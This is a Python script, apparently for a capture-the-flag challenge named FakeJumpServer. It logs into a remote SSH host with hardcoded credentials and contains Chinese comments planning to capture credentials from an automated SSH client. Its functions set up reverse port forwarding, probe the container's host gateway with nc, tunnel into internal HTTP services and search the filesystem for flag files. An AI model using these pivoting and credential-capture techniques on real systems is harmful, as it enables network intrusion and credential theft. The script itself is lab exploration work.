import paramiko
import socket
import time
import sys
import threading

"""
新发现：
1. busybox有nc (netcat)可用！
2. 有wget可用

这意味着我们可以：
1. 使用nc进行网络操作
2. 使用wget下载文件

既然我们有端口转发能力，也许我们可以：
1. 设置反向端口转发，让宿主机上的某个进程连接到我们
2. 捕获凭据或其他信息

或者，让我重新理解FakeJumpServer：
这是一个SSH跳板机伪造攻击。

关键点：
- 当真正的SSH客户端通过跳板机连接时
- 跳板机可以伪装成目标服务器
- 捕获客户端发送的密码

在这个CTF中，也许：
- 有某个自动化进程定期通过这个跳板机连接
- 我们需要捕获它的凭据

让我设置一个监听器来看看
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd(ssh, cmd, timeout=10):
    """执行命令"""
    try:
        stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
        return stdout.read().decode() + stderr.read().decode()
    except Exception as e:
        return f"Error: {e}"

def setup_listener():
    """设置监听器"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 设置反向端口转发...")
    
    # 请求反向端口转发
    port = transport.request_port_forward('', 0)
    print(f"[+] 反向端口已开启: {port}")
    
    # 创建一个handler来处理传入连接
    def handler(channel, src_addr, dest_addr):
        print(f"[!] 收到连接: src={src_addr}, dest={dest_addr}")
        
        # 读取数据
        try:
            channel.settimeout(10)
            data = channel.recv(4096)
            print(f"[!] 数据: {data}")
        except:
            pass
        
        channel.close()
    
    # 等待连接
    print("[*] 等待连接... (30秒)")
    
    # 检查容器中的网络
    print("\n容器网络信息:")
    print(exec_cmd(ssh, "ip addr"))
    print(exec_cmd(ssh, "cat /proc/net/tcp"))
    
    time.sleep(30)
    
    transport.cancel_port_forward('', port)
    ssh.close()

def test_nc_to_host():
    """使用nc测试连接到宿主机"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 使用nc测试连接...")
    
    # 测试nc是否能连接到172.17.0.1
    result = exec_cmd(ssh, "nc -v -w3 172.17.0.1 22")
    print(f"nc到172.17.0.1:22: {result}")
    
    # 测试nc到localhost
    result = exec_cmd(ssh, "nc -v -w3 localhost 22")
    print(f"nc到localhost:22: {result}")
    
    ssh.close()

def test_wget():
    """使用wget测试"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 使用wget测试...")
    
    # 测试wget
    result = exec_cmd(ssh, "wget -h")
    print(f"wget帮助:\n{result[:500]}")
    
    ssh.close()

def try_ssh_via_nc():
    """
    尝试通过nc进行SSH操作
    
    思路：用nc手动进行SSH协议交互
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 通过nc手动SSH...")
    
    # 在容器中运行nc连接到172.17.0.1，然后发送SSH握手
    channel = transport.open_session()
    channel.get_pty()
    channel.invoke_shell()
    
    time.sleep(0.5)
    if channel.recv_ready():
        channel.recv(4096)
    
    # 运行nc
    channel.send("nc 172.17.0.1 22\n")
    time.sleep(1)
    
    if channel.recv_ready():
        data = channel.recv(4096).decode()
        print(f"响应: {data}")
    
    channel.close()
    ssh.close()

def analyze_172_17_0_2():
    """分析172.17.0.2"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 分析172.17.0.2...")
    
    # 之前发现172.17.0.2:80有响应
    try:
        channel = transport.open_channel("direct-tcpip", ("172.17.0.2", 80), ('127.0.0.1', 0), timeout=5)
        channel.settimeout(5)
        
        # 发送HTTP请求
        channel.send(b"GET / HTTP/1.0\r\nHost: 172.17.0.2\r\n\r\n")
        
        time.sleep(1)
        response = b""
        while True:
            try:
                chunk = channel.recv(4096)
                if not chunk:
                    break
                response += chunk
            except:
                break
        
        print(f"HTTP响应:\n{response.decode()[:1000]}")
        
        channel.close()
    except Exception as e:
        print(f"错误: {e}")
    
    ssh.close()

def check_internal_services():
    """检查内部服务"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 检查内部服务...")
    
    # 检查一些可能的内部服务
    targets = [
        ("172.17.0.2", 80),
        ("172.17.0.2", 8080),
        ("10.0.2.2", 80),
        ("10.0.2.2", 8080),
        ("127.0.0.1", 80),
        ("127.0.0.1", 8080),
    ]
    
    for host, port in targets:
        try:
            channel = transport.open_channel("direct-tcpip", (host, port), ('127.0.0.1', 0), timeout=3)
            channel.settimeout(3)
            
            # 发送HTTP请求
            channel.send(f"GET / HTTP/1.0\r\nHost: {host}\r\n\r\n".encode())
            
            time.sleep(0.5)
            response = b""
            try:
                response = channel.recv(4096)
            except:
                pass
            
            if response:
                print(f"\n{host}:{port}:")
                print(response.decode()[:300])
            
            channel.close()
        except:
            pass
    
    ssh.close()

def search_for_flag_directly():
    """直接搜索flag"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 搜索flag...")
    
    # 搜索文件名包含flag的
    result = exec_cmd(ssh, "find / -name '*flag*'")
    print(f"包含flag的文件: {result}")
    
    # 搜索文件内容包含flag的
    result = exec_cmd(ssh, "grep -r 'flag' /")
    print(f"内容包含flag: {result}")
    
    # 检查根目录
    result = exec_cmd(ssh, "ls -la /")
    print(f"根目录: {result}")
    
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] 利用工具测试")
    print("="*60)
    
    print("\n[1] 直接搜索flag")
    search_for_flag_directly()
    
    print("\n[2] 使用nc测试")
    test_nc_to_host()
    
    print("\n[3] 分析172.17.0.2")
    analyze_172_17_0_2()
    
    print("\n[4] 检查内部服务")
    check_internal_services()
    
    print("\n[5] 通过nc手动SSH")
    try_ssh_via_nc()
